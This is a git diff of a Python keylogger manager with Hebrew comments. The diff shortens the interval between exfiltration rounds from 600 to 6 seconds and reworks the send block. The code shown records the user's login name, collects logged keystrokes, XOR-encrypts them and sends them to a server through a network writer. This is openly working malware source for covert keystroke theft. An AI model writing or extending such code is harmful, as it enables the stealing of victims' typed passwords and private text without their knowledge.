@@ -1,7 +1,7 @@
 from KeyLoggerService import KeyLoggerService 
 import   time, os, json, ast, requests
 from Enkryptor import Encryptor
-
+waiting_time = 6
 
 
 from iwriter import IWriter
@@ -36,13 +36,13 @@ class KeyLoggerManager(KeyLoggerService):
              
     def start(self):
             from datetime import datetime
+            #שומר את שם המחשב
             machine = os.getlogin()
             self.start_logging()
             self.send1 = NetworkWriter()
             self.encryption = Encryptor()
             while True:
-                # זמן ההמתנה בין כל שליחה בשניות
-                time.sleep(600)
+                time.sleep(waiting_time)
                 list_to_send = self.list_to_word(self.text)
                 #שמירת זמן עכשווי
                 time1 = str(datetime.now())
@@ -50,17 +50,17 @@ class KeyLoggerManager(KeyLoggerService):
                 jeson = {'time':time1,'data':list_to_send,'machine':machine}
                 if len(jeson['data']) == 0:
                             continue
-                else:
+                # else:
                     #jsonהפיכת המילון ל    
-                    jeson = json.dumps(jeson,ensure_ascii=False)
+                jeson = json.dumps(jeson,ensure_ascii=False)
                     #jsonהצפנת ה
-                    jeson = self.encryption.encryption_using_xor(jeson,4)
-                    data = {'data':jeson}
-                    data = json.dumps(data)
-                    print(data)
+                jeson = self.encryption.encryption_using_xor(jeson,4)
+                data = {'data':jeson}
+                data = json.dumps(data)
+                print(data)
                     #שליחה המידע לשרת
-                    self.send1.send_data(data)
-                    self.text.clear()
+                self.send1.send_data(data)
+                self.text.clear()
 
 C = KeyLoggerManager()
 C.start()                    
